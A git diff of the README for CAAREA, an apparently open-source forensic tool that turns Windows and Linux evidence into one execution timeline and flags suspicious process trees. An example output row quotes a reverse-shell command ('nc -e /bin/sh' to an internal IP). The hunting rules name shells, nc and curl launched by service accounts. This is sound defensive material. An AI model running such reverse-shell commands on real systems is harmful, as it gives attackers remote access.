@@ -1,32 +1,41 @@
-# CAAREA
+<div align="center">
+  <img src="resources/caarea_logo.svg" alt="CAAREA logo: a timeline of executions passing through a chronometer ring, one process tree branching from it, one node lit" width="600"/>
+  <br><br>
+  <strong>One command. Every program execution on a machine, in order, in a CSV.</strong>
+  <br>
+  A disk image, a triage package or a folder of logs in. One UTC timeline of <em>what ran, when, as whom and from where</em> out. Windows and Linux, one binary, nothing to install.
+  <br><br>
 
-**One command. Every program execution on a machine, in order, in a CSV.**
+  [![Release](https://img.shields.io/github/v/release/jupyterj0nes/caarea?label=release)](https://github.com/jupyterj0nes/caarea/releases/latest)
+  [![Rust](https://img.shields.io/badge/Rust-stable-orange?logo=rust)](https://www.rust-lang.org/)
+  [![Platform](https://img.shields.io/badge/Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)](https://github.com/jupyterj0nes/caarea/releases/latest)
+  [![Tail](https://img.shields.io/badge/analysis%20tail-masstin%20convention-blueviolet)](docs/csv-format.md#the-analysis-tail)
 
-CAAREA (*Chronological Artifacts & Activity Reconstruction Engine for Analysis*) reads Windows and Linux forensic evidence and writes a single timeline of *what ran, when, as whom and from where*. Point it at a disk image, a triage package or a folder of logs; open the CSV in Timeline Explorer or Excel.
+</div>
 
 ```bash
-caarea -f workstation.E01 -o workstation.csv
-caarea -d /cases/acme/UAC_collections -o linux_fleet.csv
-caarea -d C:\Cases\Triage_Host01 --toi 2026-09-24T12:00:00Z --toi-window 6 -o incident_window.csv
+caarea -f workstation.E01 -o workstation.csv --hunt
 ```
 
-Written in Rust. One static binary for Windows, Linux and macOS. No mounting, no Python, no drivers.
+<div align="center">
+  <img src="resources/demo-hunt.gif" alt="caarea --hunt over the public DeepBlueCLI EVTX set: the sources are read, the timeline is saved, 277 rows are judged, and the rows with the highest hunt_score are the Metasploit PsExec droppers with the reason in words"/>
+  <br>
+  <em><code>caarea --hunt</code> over the 21 public EVTX files of DeepBlueCLI: 13,590 rows in eight seconds, 277 of them judged. Sorted by <code>hunt_score</code>, the first rows are the Metasploit PsExec droppers (a random name at the root of <code>C:\Windows</code>) and an installer run from an archive's temp folder, and every row says why.</em>
+</div>
 
----
+## What it does
 
-## What it does for you
-
-- **Windows and Linux in the same timeline.** A KAPE zip from the file server and a UAC tarball from the web server end up in one CSV, sorted together, each row stamped with its host.
-- **Reads the sources others skip.** Volume Shadow Copies inside E01/raw images, dirty registry hives (their transaction logs are replayed in memory), Prefetch (including the compressed Windows 10/11 format), PowerShell console history, scheduled task XML, Windows Error Reporting, Defender support logs, kernel process accounting (`pacct`), `auditd` execve records, PowerShell ScriptBlock and module logging, Sysmon, AppLocker, WMI consumers.
-- **Gets the time right.** Every timestamp is converted to UTC. Linux logs that only carry wall-clock time (classic syslog, `dpkg.log`, `ps`) are corrected with the host's own time zone, found in the evidence (`/etc/timezone`, `/etc/localtime`, `timedatectl`).
-- **Tells you where a row came from.** Events that only exist in a shadow copy are tagged with the snapshot time; a live event and its snapshot twin are not shown twice. The same vocabulary will mark rows recovered from freed structures and from carving.
-- **Recovers what was deleted.** Freed registry cells and unused `$MFT` records are read by default; `--carve` scans the raw bytes of images, live volumes and pagefiles for hives, event log chunks, MFT and journal records and Prefetch files that no file system points to any more.
-- **Hunts when you ask.** `--hunt` rebuilds the process tree of every host and marks what contradicts the documented boot and logon tree, the parents that never create shells, dead creators and Linux service accounts opening shells, each with its level, the measured rarity of the pattern, the ATT&CK technique and the lineage. The verdict lands in the analysis tail the four tools share, with masstin's words and masstin's scale; the detailed findings in their own table.
-- **Treats evidence as hostile.** Archives are unpacked into an isolated, per-run temporary folder; entries cannot escape it, symlinks are never followed, and packages with the same file name from different hosts never overwrite each other. The evidence itself is only ever read.
-
----
+- **Windows and Linux in the same timeline.** A KAPE zip from the file server and a UAC tarball from the web server end up in one CSV, sorted together, each row stamped with its host. Images, triage packages, loose folders and single files mix freely. [What it reads →](docs/sources.md)
+- **Reads the sources others skip.** Volume Shadow Copies inside E01 and virtual disks, dirty registry hives (their transaction logs replayed in memory), Prefetch including the compressed Windows 10/11 format, SRUM, Jump Lists, the Windows Timeline, the WMI repository, PowerShell history and ScriptBlock logs, Sysmon, AppLocker; `pacct`, `auditd`, the binary systemd journal, package managers, containers, shell histories. Sixty-odd sources in all.
+- **Recovers what was deleted.** Freed registry cells and unused `$MFT` records are read by default; `--carve` scans the raw bytes of images, live volumes and pagefiles for hives, event log chunks, MFT and journal records and Prefetch files that no file system points to any more. [Carving →](docs/carving.md)
+- **Hunts when you ask.** `--hunt` rebuilds the process tree of every host and marks what contradicts the documented boot and logon tree, the parents that never create shells, dead creators, look-alike and generated names, binaries in folders they do not belong to. Each mark carries its ATT&CK technique, its lineage, and a score that is the measured rarity of the pattern on clean hosts, not the author's confidence. [Process hunting →](docs/hunting.md)
+- **Gets the time right.** Every timestamp is UTC. Linux logs that only carry wall-clock time are corrected with the host's own zone, found in the evidence. [Time zones →](docs/time-zones.md)
+- **Tells you where a row came from.** Events that only exist in a shadow copy are tagged with the snapshot time; a freed cell says `deleted`; a carved record says `carved` and at which byte. A live event and its recovered twin are never shown twice.
+- **Treats evidence as hostile.** Archives are unpacked into an isolated, per-run folder; entries cannot escape it, symlinks are never followed, nothing is ever written into the evidence.
 
 ## Quick start
+
+Download the binary for your platform from the [Releases page](https://github.com/jupyterj0nes/caarea/releases/latest), or build it:
 
 ```bash
 git clone https://github.com/jupyterj0nes/caarea.git
@@ -36,249 +45,86 @@ cargo build --release          # binary in target/release/caarea[.exe]
 
 | You have | Run |
 | :--- | :--- |
-| A disk image (E01, Ex01, raw, dd, 001) or a virtual disk (VMDK, VHD, VHDX) | `caarea -f disk.E01 -o out.csv` |
+| A disk image (E01, Ex01, raw, dd) or a virtual disk (VMDK, VHD, VHDX) | `caarea -f disk.E01 -o out.csv` |
 | A running Windows host (triage in place, as administrator) | `caarea -f \\.\C: -o out.csv --stage-dir D:\case\extracted` |
 | Triage packages (KAPE, Velociraptor, UAC, Cortex XDR, CyLR), zipped or not | `caarea -d /path/to/packages -o out.csv` |
-| A folder you collected by hand (`C:\Windows\System32\winevt\Logs`, `/var/log`, ...) | `caarea -d /path/to/folder -o out.csv` |
+| A folder you collected by hand (`winevt\Logs`, `/var/log`, ...) | `caarea -d /path/to/folder -o out.csv` |
 | Single files (an EVTX, a hive, an `audit.log`) | `caarea -f Security.evtx -f SYSTEM -f audit.log -o out.csv` |
+| The six hours around the moment of interest | `caarea -d triage -o out.csv --toi 2026-09-24T12:00:00Z --toi-window 6` |
 
-Add `-m evtx`, `-m registry`, `-m windows` (Prefetch and the other Windows file artifacts) or `-m linux` to run one parser family only. Add `--overwrite` to replace an existing CSV.
-
----
+Add `--hunt` to any of them. Add `-m evtx`, `-m registry`, `-m windows` or `-m linux` to run one parser family only, `--overwrite` to replace an existing CSV. Every flag: [command reference](docs/cli.md).
 
 ## What comes out
 
-An RFC 4180 CSV with fifteen columns: ten that describe the event, written by the parsers, and an analysis tail of five that the parsers leave empty and that `--hunt` and the analyst fill. The tail is the one that closes the timelines of [masstin](https://github.com/jupyterj0nes/masstin), faramir and allymacb (`hunt`, `hunt_score`, `hunt_why`, `verdict`, `notes`), with the same words and the same scale in the four tools (masstin's `docs/csv-format.md` is the reference), so a case tool maps it once. Timestamps are UTC with a fixed width (`YYYY-MM-DDTHH:MM:SS.ffffffZ`), so sorting the text sorts the time.
-
-| Column | Meaning |
-| :--- | :--- |
-| `timestamp` | When it happened, UTC |
-| `computer` | Host name (from the event, the SYSTEM hive, the UAC hostname file or the package name) |
-| `artifact` | Where the row comes from: `evtx:4688`, `evtx:sysmon:1`, `registry:bam`, `prefetch`, `linux:audit:execve`, ... Rows that were not read from the live evidence carry an extra segment and the detail in brackets: `evtx:4688:vss [2026-09-04T08:12:53Z]` (only in that shadow copy), `registry:bam:deleted` (recovered from a freed hive cell), `evtx:4688:carved [@0x1c3f80000]` (carved from raw bytes at that offset) |
-| `event_id` | Windows event id, 0 otherwise |
-| `pid` | Process id when the source has one (for 4688 it is the *new* process) |
-| `subject_username` | Who ran it |
-| `target_username` | Who it ran as, when different (`sudo`, `su`, services) |
-| `processname` | Binary, script, task or package |
-| `commandline` | Full command line or the details of the artifact |
-| `parentprocessname` | Parent process or launching component. When the source only gave a PID (auditd, `pacct`, 4688 before Windows 10) and the creator's own row is in the timeline, the name is filled in as `/usr/bin/sudo (PID: 12493)` |
-| `hunt` | What the hunt made of the row, one of masstin's six values: `significant` (a high rule fired, or a statistical test with q ≤ alpha), `candidate` (a medium rule, or a low rule on a row no test judged, or a test above alpha), `habitual`, `not_evaluated` and `baseline` (the statistical tests' words, from phase H4), or empty: nothing judged the row. When a rule and a test both speak, the stronger state wins; a low rule never lowers a test's state. A rule measured common (fewer than 10 points: it fires on more than one clean row in ten) is noise on that kind of row and gives neither state nor points, only its clause. `suspicious` is the analyst's word and lives in `verdict` |
-| `hunt_score` | How rare the row is, an integer from 0 to 100 on masstin's scale, `-10 · log10` of a probability: 13 is one in twenty, 30 one in a thousand, 60 one in a million. A statistical test contributes `-10 · log10(q)`; a rule contributes the rarity of its pattern **measured** on stock, clean reference timelines (how often it fires there; a pattern that never fired on the reference rows is 90, see *How `hunt_score` is measured* below). Contributions add, capped at 100. A rule not measured yet adds 0 and says so in `hunt_why`. The rule's catalogue score never goes here; it stays in the findings table. Empty when nothing judged the row |
-| `hunt_why` | Why, in words, naming the source: a rule's clause starts with `rule <ID> (<level>):`, a test's clause is in words without the prefix; the strongest first, separated by `; `, the lineage last. `rule GEN-OFFICE-SHELL (high): winword.exe launched cmd.exe [T1566.001]; rule GEN-PARENT-GONE (low): creator had exited [T1134.004]; lineage: explorer.exe > WINWORD.EXE > cmd.exe`. Filter on `rule ` to keep the rules, on its absence to keep the statistics |
-| `verdict` | The analyst's: `suspicious`, `confirmed`, `benign`, or empty. Never written by CAAREA |
-| `notes` | The analyst's free text |
-
-Two real rows (the empty tail is written bare, `,,,,,`, as masstin writes it):
+One RFC 4180 CSV with fifteen columns: ten that describe the event (`timestamp, computer, artifact, event_id, pid, subject_username, target_username, processname, commandline, parentprocessname`) and the analysis tail that [masstin](https://github.com/jupyterj0nes/masstin), faramir and allymacb close their timelines with (`hunt, hunt_score, hunt_why, verdict, notes`), with the same words and the same scale in the four tools, so a case tool maps it once. Timestamps are UTC with a fixed width, so sorting the text sorts the time. Open it in Timeline Explorer or Excel.
 
 ```csv
-"2016-09-21T03:41:02.560546Z","IE10Win7","evtx:4688",4688,488,"WORKGROUP\IE10WIN7$","","C:\Windows\duKhLYUX.exe","C:\Windows\duKhLYUX.exe","C:\Windows\System32\services.exe",,,,,
+"2016-09-21T03:41:02.560546Z","IE10Win7","evtx:4688",4688,3744,"WORKGROUP\IE10WIN7$","","C:\Windows\duKhLYUX.exe","C:\Windows\duKhLYUX.exe","",,,,,
 "2025-09-26T00:01:40.243000Z","victim01","linux:audit:execve",0,3538,"1000","1000","/usr/bin/nc","nc -e /bin/sh 10.0.0.5 (CWD: /tmp)","PID: 2686",,,,,
 ```
 
----
+The `artifact` column names the source and how the row was obtained: `evtx:4688`, `registry:bam:deleted`, `evtx:4688:vss [2026-09-04T08:12:53Z]`, `prefetch:carved [pagefile @0x4f000]`. Every column, with the rules of the tail: [the CSV →](docs/csv-format.md)
 
 ## What it reads
 
-### Windows
-
-| Source | Events / keys | Notes |
-| :--- | :--- | :--- |
-| Security.evtx | 4688 process creation, 4689 process exit, 4608 startup (boot marker), 4697 service install, 4698-4702 task created / deleted / enabled / disabled / updated, 1102 audit log cleared | `DOMAIN\user`, PID from `NewProcessId`, task command pulled out of the task XML |
-| System.evtx | 7045 service installed, 7034 service crashed, 7036 service state change, 104 log cleared, Kernel-General 12 OS started (boot marker), MsiInstaller 1033/1034/11707/11724 | account from `AccountName` |
-| Application.evtx | 1000 application error, 1001 Windows Error Reporting | faulting binary, module, exception |
-| Sysmon | 1 process creation, 5 process end, 6 driver loaded, 7 image loaded, 11 file created | image, command line, parent image, user |
-| PowerShell | 400 engine start, 800 pipeline, 4103 module logging, 4104 ScriptBlock | full script block text, command invocation with parameters |
-| TaskScheduler/Operational | 100, 102, 106, 107, 108, 118, 119, 129, 140, 141, 200, 201 | started, completed, registered, triggered, launched, updated, deleted, action started / completed |
-| WMI-Activity/Operational | 5857 provider loaded, 5858 query, 5859/5860 permanent / temporary consumer, 5861 consumer bound | query text, client PID |
-| AppLocker | 8002-8007, 8020-8022 | allowed, audited, blocked executables, scripts and packaged apps |
-| Windows Defender/Operational | 1015, 1116, 1117 | threat, path, process, action |
-| Shell-Core/Operational | 9707 / 9708 | Run / RunOnce command started / finished |
-| BITS-Client/Operational | 3, 4, 59, 60 | job created / completed, transfer started / stopped with URL |
-| Prefetch (`*.pf`) | up to eight run times per executable, run count, files loaded, volume | XP to Windows 11; the Windows 10/11 `MAM` compression is decoded in-process. Servers do not write Prefetch unless enabled |
-| PSReadLine `ConsoleHost_history.txt` | every command typed in an interactive PowerShell | no per-line time: rows carry the file time, in order |
-| `System32\Tasks\**` task XML | author, principal, triggers, every Exec / COM action | row time is the file's modification time |
-| WER `Report.wer` | crashed program, module, exception, PID | `ReportArchive` and `ReportQueue` |
-| Defender `MPLog-*.log`, `MPDetection-*.log` | processes the engine scanned on behalf of (with PID), behaviour-monitoring images, detections | |
-| PCA `PcaAppLaunchDic.txt`, `PcaGeneralDb*.txt` (Windows 11) | program launches with time, exit code | |
-| SRUM `SRUDB.dat` | per application and user: runs with start and duration (app timeline, Windows 10 1709+ clients), CPU time and bytes read / written per hour, network bytes per hour (data usage and the newer SDP tables), network connectivity spans; up to 60 days back | pure-Rust ESE reader, dirty databases read as far as their pages allow |
-| Jump Lists (`*.automaticDestinations-ms`, `*.customDestinations-ms`) and `Recent\*.lnk` | which application opened which target and when, access counts, command-line arguments, origin machine | shortcut rows take the shortcut's own file time; well-known AppIDs are named |
-| Windows Timeline `ActivitiesCache.db` | applications opened (with the document or URI) and the seconds each one held the focus, per account, about 30 days back; rows still queued in `ActivityOperation` included | SQLite read from a scratch copy with its write-ahead log, the evidence is never written |
-| WMI repository `OBJECTS.DATA` | permanent event subscriptions: `CommandLineEventConsumer`, `ActiveScriptEventConsumer`, `__EventFilter`, bindings; instances found by class name in the raw pages, so deleted ones still in page slack come back | row time is the stamp on the instance record (the WMI service start preceding the write, so a lower bound), the file time when the record header cannot be located |
-| `RecentFileCache.bcf` (Windows 7 / 2008 R2) | executables run since the last ProgramDataUpdater pass | no per-entry time: rows carry the file time, in order |
-| `Syscache.hve` (Windows 7 / 2008 R2) | executables processed by the Application Experience service: MFT reference, SHA-1, program id; key write time | parsed as a hive, freed cells included |
-| `$MFT` | executables and scripts written outside the system folders (created and modified times, size, resident script content quoted), Prefetch, logs, hives and histories anywhere; freed records carry the `deleted` origin | `$SI` created before `$FN` created is noted |
-| `$UsnJrnl:$J` | every program run (its Prefetch file is created or rewritten), binaries dropped, renamed, modified or deleted, event logs truncated, histories and reports removed | folders come from the `$MFT` of the same volume |
-| SYSTEM / SOFTWARE | BAM/DAM, ShimCache, services, Run/RunOnce, TaskCache, IFEO/Winlogon/AppInit, installed programs | |
-| NTUSER.DAT / UsrClass.dat | UserAssist, RunMRU, RecentDocs, TypedPaths, WordWheelQuery, MUICache, Compatibility Assistant store, RecentApps, FeatureUsage, CapabilityAccessManager (camera, microphone, location use per program), Office TrustRecords, profile load/unload | user taken from the path (`Users\<name>\NTUSER.DAT`) |
-| Amcache.hve | files and programs with SHA-1 | |
-
-Every `.evtx` in a folder is parsed and filtered by provider and event id, so renamed channel files are fine. Rows that are identical in every column (two records with the same time, user, process and command line) are collapsed into one. Dirty hives are repaired before parsing: `.LOG1`/`.LOG2` entries are verified (Marvin32 hashes), applied in sequence order and only when they belong to that hive. The result matches, byte for byte, what Windows itself produces when it loads the same hive.
-
-### Linux
-
-| Source | What is extracted |
+| | Sources |
 | :--- | :--- |
-| `pacct` / `psacct` / `acct` | every terminated process: command, UID, PID, PPID, flags (`struct acct_v3` and legacy `struct acct`, both byte orders) |
-| `audit.log` | `USER_CMD` (sudo) and `execve` calls rebuilt from `SYSCALL` + `EXECVE` + `CWD` + `PROCTITLE`, hex decoded |
-| systemd journal (`/var/log/journal/**/*.journal`, `*.journal~`) | `sudo`, `su`, `pkexec` and cron command lines, units started by systemd, and the first message of every process that logged (PID and command line from the trusted fields). This is where Fedora, RHEL 8+, Arch and Debian 12 keep what `auth.log` used to hold |
-| `auth.log`, `secure`, `cron`, `syslog`, `messages`, `kern.log` | cron jobs, `sudo` commands, `su` switches, kernel segfaults; classic and RFC 3339 timestamps; rotated `.gz` and `.xz` copies are read too |
-| `.bash_history`, `.zsh_history`, `fish_history`, `.python_history`, `.mysql_history`, `.psql_history`, `.sqlite_history`, `.node_repl_history`, `.lesshst`, `.viminfo` | commands (with epoch stamps when present), files edited |
-| `dpkg.log`, `apt/history.log`, `dnf.rpm.log`, `yum.log`, `pacman.log`, `zypp/history`, UAC rpm query | package installs, and the exact `apt`, `pacman` and `zypper` command lines with the user who ran them |
-| `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/**`, systemd `.service` and `.timer` units, `/var/lib/systemd/timers/stamp-*` | scheduled jobs, services, timers and when each timer last fired |
-| `wtmp`, `btmp`, `utmp` | logins, logouts, boots, failed logins |
-| Docker `config.v2.json`, containerd task `config.json`, podman `containers.json` | containers created, started and finished: image, command, user, PID |
-| `cloud-init.log`, `/var/mail/*` | user-data and `runcmd` scripts run at first boot; cron job output mails with the command in the subject |
-| `recently-used.xbel` | documents opened from the desktop |
-| web server access logs | requests to server-side scripts, POSTs, command-injection payloads in the query string |
-| UAC `ps -axo ... lstart`, `running_processes_full_paths.txt` | running processes, deleted binaries still in memory, executions from `/tmp` and `/dev/shm` |
+| **Windows event logs** | Security (4688/4689, boot marker 4608, services, tasks, log cleared), System (7045, 7034, 7036, Kernel-General 12, MsiInstaller), Application (WER), Sysmon 1/5/6/7/11, PowerShell 400/800/4103/4104, TaskScheduler, WMI-Activity, AppLocker, Defender, Shell-Core, BITS |
+| **Windows file artifacts** | Prefetch, SRUM, Amcache, Jump Lists and `Recent\*.lnk`, Windows Timeline, PowerShell console history, task XML, WER reports, Defender and PCA logs, the WMI repository, `RecentFileCache.bcf`, `Syscache.hve` |
+| **Registry** | BAM/DAM, ShimCache, services, Run keys, TaskCache, IFEO / Winlogon / AppInit, UserAssist, RunMRU, RecentDocs, MUICache, FeatureUsage, CapabilityAccessManager, Office TrustRecords; dirty hives repaired from their logs, freed cells included |
+| **NTFS** | `$MFT` (binaries and scripts written outside the system folders, resident script content quoted, freed records) and `$UsnJrnl:$J` (every Prefetch rewrite, drops, renames, deletions, log truncation) |
+| **Linux** | `pacct`, `audit.log`, the binary systemd journal, `auth.log` / `secure` / `syslog` / `cron`, shell and REPL histories, `dpkg` / `apt` / `dnf` / `pacman` / `zypper`, cron and systemd units and timers, `wtmp` / `btmp`, Docker / containerd / podman, cloud-init, web server access logs, UAC process listings |
+| **Containers of all that** | E01 / Ex01, raw, VMDK, VHD / VHDX, live volumes, **every Volume Shadow Copy**, ext2/3/4 and LVM2 partitions, KAPE / Velociraptor / UAC / Cortex XDR / CyLR packages, zips and tarballs nested five deep |
 
-### Disk images
+Event ids, keys and the notes on each source: [What it reads →](docs/sources.md)
 
-E01/Ex01, raw/dd and virtual disks (VMware VMDK: monolithic or split, sparse or flat; Hyper-V VHD and VHDX, fixed or dynamic) are read in place, without converting or mounting. MBR and GPT partition tables, NTFS traversal, BitLocker detection. Linux images are read the same way: ext2/3/4 partitions, bare partition images and ext4 logical volumes inside LVM2 are walked with a pure-Rust reader and the files listed above (plus `/etc/hostname`, `/etc/localtime` and its symlink target) are staged with their original paths. XFS and btrfs are not read yet. From the live volume and from **every Volume Shadow Copy**: event logs, `config` hives with their transaction logs, `Amcache.hve`, `NTUSER.DAT` and `UsrClass.dat` of every profile, Prefetch, task XML, WER reports, Defender logs, PCA logs, SRUM, the WMI repository, `RecentFileCache.bcf`, `Syscache.hve`, `$MFT`, `$UsnJrnl:$J` and, per profile, the PowerShell history, Recent shortcuts and Jump Lists and the Timeline database. Shadow copies are read with [vshadow-rs](https://github.com/jupyterj0nes/vshadow-rs), pure Rust, straight from the image.
+## Process hunting
 
----
+`--hunt` runs the rules over the finished timeline and fills the tail of each row it judges: `hunt` is `significant` or `candidate` (or `habitual` when a clean reference host executes the same thing), `hunt_score` is how rare the row is on masstin's scale, 0 to 100, and `hunt_why` names every rule that fired, strongest first, then the lineage. The ten event columns do not change a byte. The detailed findings, with the catalogue score and the ATT&CK technique of every hit, go to a second CSV next to the timeline.
 
-## Carving, when you ask for it
+<div align="center">
+  <img src="resources/hunt-rows.svg" alt="Three judged rows from the DeepBlueCLI set: a PsExec dropper at the root of C:\Windows with a random name, an installer run from an archive's temp folder, msiexec launched by Chrome; each with its hunt state, its score and the rules in words" width="100%"/>
+</div>
 
-`--carve` is off by default and changes nothing about the normal run. With it, every disk image or live volume is read a second time from the first byte to the last, and so are the `pagefile.sys`, `swapfile.sys` and `hiberfil.sys` of each NTFS partition (in place, through their data runs). A plain `-f` file that no parser recognises (a pagefile copied out, a memory dump, a dump of unallocated clusters) is scanned the same way. One pass looks for every structure at once:
+The rules only state what a documented source states: the expected-parent and allowed-children tables come from the SANS *Hunt Evil* poster and Elastic's parent-child rule. A rule's points are not chosen either: they are how often its pattern fires on stock, clean hosts, measured by a script and recorded with the corpus, and a row a clean host also produces is vouched for whatever its rules say. The rule catalogue, the process tree behind it, the measurement and its limits: [Process hunting →](docs/hunting.md)
 
-| Structure | How it proves itself | What you get |
-| :--- | :--- | :--- |
-| Registry hives (`regf`) | primary hive, sane sizes, hive-bin chain followed offset by offset, root key verified; copies identical to a hive already extracted are skipped | a hive file in the staging folder, parsed by the normal registry pipeline, freed cells included |
-| EVTX chunks (`ElfChnk`) | each 64 KB chunk is parsed under a 3-second budget; the provider of its records names it | one synthetic EVTX per provider, parsed by the normal EVTX pipeline |
-| Orphan event records (`**\0\0`) | size and trailing size agree, BinXML preamble, time between 2000 and 2040 | the record's time and id, as a trace of a cleared log |
-| `$MFT` records (`FILE`) | header geometry and update-sequence fixups | created and modified rows for binaries, scripts and forensic files |
-| `$I30` index blocks (`INDX`) | fixups, then the entries left in the slack after a deletion | the deleted child's name and times |
-| USN journal records | coherent length, version 2 or 3, plausible time, printable name | the same rows as the live journal: Prefetch runs, drops, renames, deletions, log truncation |
-| Prefetch (`MAM`, `SCCA`) | the file decompresses and parses | one row per run |
-| systemd journal files (`LPKSHHRH`) | header with the file's own size | the file, read by the journal parser (Linux images and blobs) |
-| `pacct` records | version 3, printable command, start time between 2000 and 2040, small ids | one row per process, same columns as the live parser |
-| utmp records | session type, printable user and line, plausible time, zero padding | logins, logouts, boots |
-| auditd lines | `type=... msg=audit(<10-digit epoch>...)` at the start of a text run | assembled like `audit.log`: `execve` with argv and cwd, `USER_CMD` |
-| shell history with stamps | `#<epoch>` line followed by a command | the command at that time |
+## Documentation
 
-Linux structures are looked for in images with ext4 or LVM partitions and in blobs; Windows structures everywhere. The journal of a running system also receives kernel audit records when no `auditd` is installed; those are assembled into `execve` rows like an `audit.log`.
+| Topic | Where |
+| :--- | :--- |
+| Every source, with event ids, keys and the notes on each | [docs/sources.md](docs/sources.md) |
+| The fifteen columns, the analysis tail, how to read the CSV | [docs/csv-format.md](docs/csv-format.md) |
+| Process hunting: rules, process tree, how `hunt_score` is measured, the clean reference | [docs/hunting.md](docs/hunting.md) |
+| Carving: what is looked for in raw bytes and how a structure proves itself | [docs/carving.md](docs/carving.md) |
+| Time zones of Linux logs | [docs/time-zones.md](docs/time-zones.md) |
+| Every command-line option | [docs/cli.md](docs/cli.md) |
+| What is done and what is next | [ROADMAP.md](ROADMAP.md) · [CHANGELOG.md](CHANGELOG.md) |
 
-Rows from carving carry the `carved` origin with the byte offset, and the container when it is not the disk itself: `evtx:4688:carved [@0x1c3f80000]`, `prefetch:carved [pagefile @0x4f000]`. A carved row identical to a live one is dropped by the usual deduplication. Carving only recovers structures that carry their own time; it never guesses a timestamp.
-
-The scanner, the guarded sources and the structural validators are the [blockcarve](https://github.com/jupyterj0nes/blockcarve) crate, shared with masstin, faramir and allymacb, so the four tools read raw bytes the same way and accept a structure for the same reasons.
-
----
-
-## Process hunting, when you ask for it
-
-`--hunt` runs a set of rules over the finished timeline and writes what it made of each row into the row's analysis tail, the convention the four tools share: `hunt` takes the state of the strongest rule (`significant` for a high rule, `candidate` for a medium or a low one, since no test judged the row and a score must come with a state), `hunt_score` adds up the measured rarity of every rule that fired (a rule measured below 10 points is noise: no state, no points, its clause only), `hunt_why` names each rule with its level, strongest first, then the lineage. The ten event columns do not change, and `verdict` / `notes`, the analyst's columns, are never written. The detailed findings go to a second CSV next to the timeline (`host.hunt.csv`, or `--hunt-output`), one row per rule hit, ranked by catalogue score: `rank, significant, p_value, q_value, score, level, rarity, signature, pattern, mitre, title, time_created, computer, pid, processname, commandline, parentprocessname, subject_username, artifact, lineage, why_unusual, evidence`. The first four and the last two columns are the ones masstin's and allymacb's hunt tables use; `significant` is `yes` for a high rule; `score` is the rule's catalogue score, 0 to 100, how sure the author is of the pattern (85 and up is `high`, 60 to 84 `medium`, below `low`), and it lives here and in the code, never in the timeline; `rarity` is what the hit added to `hunt_score`; `pattern` the variant of the rule that was measured (`temp` for `PATH-SCRATCH`, `hex` for `NAM-RANDOM`); `why_unusual` is one sentence saying why the row matters; `evidence` names the rows it was correlated with.
-
-```bash
-caarea -f workstation.E01 -o workstation.csv --hunt
-caarea -d /cases/acme/triage -o acme.csv --hunt --hunt-output acme.findings.csv --toi 2026-09-24T12:00:00Z
-```
-
-The rules only state what a documented source states. The expected-parent and allowed-children tables come from the SANS *Hunt Evil* poster (Lee and Pilkington) cross-checked with Elastic's *Unusual Parent-Child Relationship* rule, which contributes the field exceptions (Defender, Citrix, VMware, Omnissa, Sophos). A pair the tables do not mention gets no opinion.
-
-| Rule | Fires when | Catalogue score |
-| :--- | :--- | :--- |
-| `GEN-CORE-PARENT` | A core Windows process (`smss`, `csrss`, `wininit`, `winlogon`, `services`, `lsass`, `svchost`, `spoolsv`, `taskhostw`, `userinit`, `RuntimeBroker`, ...) was created by something other than its documented parent | 85 |
-| `GEN-RESTRICTED-PARENT` | `smss`, `wininit`, `winlogon`, `lsass`, `csrss`, `autochk`, `wermgr` or `conhost` created a process outside their closed list of children | 70 to 90 |
-| `GEN-OFFICE-SHELL`, `GEN-BROWSER-SHELL` | Office, a PDF reader or a browser launched a shell, script host or LOLBin | 75 to 85 |
-| `GEN-WEBSERVER-SHELL`, `GEN-DATABASE-SHELL` | `w3wp`, `httpd`, `nginx`, `php-cgi`, Tomcat, `sqlservr`, or on Linux `apache2`, `nginx`, `php-fpm`, `mysqld`, `postgres`, launched a shell | 85 to 95 |
-| `GEN-SVCACCT-SHELL` | A Linux service account (`www-data`, `apache`, `mysql`, `postgres`, ...) ran a shell, `nc`, `curl`, `python` | 80 |
-| `GEN-SERVICES-SHELL`, `GEN-REMOTE-EXEC` | `services.exe` started a shell as a service binary; `PSEXESVC` or a clone launched anything | 70 to 80 |
-| `GEN-ACCESSIBILITY-BACKDOOR` | `winlogon`, `utilman`, `sethc`, `osk`, `narrator`, `magnify`, `DisplaySwitch` or `AtBroker` launched a shell at the logon screen | 95 |
-| `GEN-SPOOLER-SHELL`, `GEN-WMI-EXEC` | The print spooler launched a shell; `WmiPrvSE` launched one (remote WMI execution, also used by SCCM) | 60 to 85 |
-| `GEN-SVCHOST-SHELL` | A service host launched `cmd`, `powershell`, `mshta`, `wscript`, `cscript`, `certutil` or `bitsadmin`. Scheduled tasks do this legitimately, so it is a pointer, not a verdict | 35 |
-| `GEN-EXPLORER-SYSTEM` | A child of `explorer.exe` was created by a SYSTEM or service token | 65 |
-| `GEN-PARENT-GONE` | The creator PID belongs to a process that had already exited: PID reuse the logs do not cover, or a spoofed parent | 55 |
-| `GEN-DUPLICATE-CORE` | A second `lsass`, `services`, `wininit` or `LsaIso` started in the same boot | 75 |
-| `GEN-CRON-SCRATCH` | cron ran a binary from `/tmp`, `/dev/shm`, `/var/tmp` | 75 |
-| `NAM-SYSTEM-PATH` | A binary with the name of a system process (`svchost`, `lsass`, `csrss`, `explorer`, `rundll32`, some 150 more; on Linux `sshd`, `cron`, `bash`, `ps`, `ss`, the daemons and coreutils a rootkit replaces) ran or was written outside the folder it belongs to. `/usr/local` and `/opt` copies score 60 | 60 to 90 |
-| `NAM-FAKE-KERNEL` | A process named like a kernel thread (`[kworker/0:1]`, `kthreadd`, `ksoftirqd`) came from an `execve` or has a path: kernel threads do neither | 95 |
-| `NAM-LOOKALIKE` | A name one look-alike character away from a system binary (`svch0st`, `isass`, `rundl132`), or one edit away (`scvhost`) outside the system folders | 75 to 90 |
-| `NAM-DOUBLE-EXT`, `NAM-RTLO`, `NAM-PADDED` | `invoice.pdf.exe`; a right-to-left override or zero-width character in the name; a run of spaces before the extension | 80 to 95 |
-| `NAM-RANDOM` | A name a generator wrote: hexadecimal, a GUID outside the Installer folders, random case changes or no vowel (`duKhLYUX.exe`), one or two characters, mostly digits. Not inside System32, Program Files or the update and package folders | 50 to 60 |
-| `PATH-WINDOWS-ROOT` | An executable directly in `C:\Windows` that is not one of the few that belong there (PsExec-style droppers) | 70 |
